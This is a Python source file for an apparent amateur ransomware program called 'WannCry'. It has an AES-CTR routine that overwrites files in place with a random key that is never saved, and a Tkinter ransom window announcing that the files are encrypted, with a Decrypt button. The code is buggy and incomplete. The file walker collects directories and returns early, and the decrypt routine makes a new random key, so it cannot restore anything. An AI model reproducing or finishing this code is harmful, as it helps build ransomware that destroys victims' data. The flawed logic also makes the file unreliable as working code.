import os
import time
import tkinter
from time import *
from tkinter import *
from tkinter import scrolledtext

from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter


def data():
    ap = []
    ex = ['png '  , 'txt' , 'mp4' , 'py' , 'jpg' ]
    for i  , f , d in os.walk('Wallaper'):
        for z in d :
            full_path = os.path.join( i , z  )
            full_path.split('.')[-1]
            if os.path.exists(full_path):
                ap.append(full_path)
        return (ap)

data = data()
def partions():
    par = []
    for i in range( 65 , 101):
        x=chr(i)
        x.upper()
        par.append(x)
        print (par)
        return par

    
def encrypt(file):
    key = Random.new().read(16)
    counter = Counter.new(128)
    c=AES.new(key , AES.MODE_CTR , counter=counter )
    with open(file , 'r+b')as f :
        data =16
        block = f.read(data)
        while block:
            f.seek(-len(block) , 1)
            f.write(c.encrypt(block))
            block = f.read(data)






     



def decrypt(file):
    key = Random.new().read(16)
    counter = Counter.new(128)
    c=AES.new(key , AES.MODE_CTR , counter=counter )
    with open(file , 'r+b')as f :
        data =16
        block = f.read(data)
        while block:
            f.seek(-len(block) , 1)
            f.write(c.decrypt(block))
            block = f.read(data) 





root = Tk()
root.title('WannCry')
root.configure(background='#d63031')
root.geometry('800x800')
root.iconbitmap('coin.png')
root.resizable(0, 0)
txt = scrolledtext.ScrolledText(root , font=('Arial' , 20) , state='normal' , width=50 , height = 20)
txt.insert(
    INSERT ,
        """
        """
                   )
coin = PhotoImage(file='coin.png' )
label_text = Label(root , text='OooPs , your files have been encrypted' , font=('Arial' , 30 ) , bg='#d63031')
imglabel = Label(root , relief='flat' )
imglabel.grid(row=1 , column=0 , pady=20)
en = Entry(root,   width=50, relief='flat'  )
def unlock():
    for i in data: 
        decrypt(i)
    print ('wait while Decrypted files ....')
    
    print ('Done')
bu = Button(root,   text='Decrypt' ,  width=20 , relief= 'groove'   , command=unlock ,)

pady = 10
padx = 10
txt.grid            (row = 1,  column= 0  , padx= padx , pady= pady)
en.grid             (row = 2 , column = 0 , padx=padx  , pady=pady )
label_text.grid     (row = 0 , column = 0 , padx= padx ,pady= pady)
bu.grid             (row = 3 , column = 0 , padx= 20 ,pady= 4 )
root.mainloop()
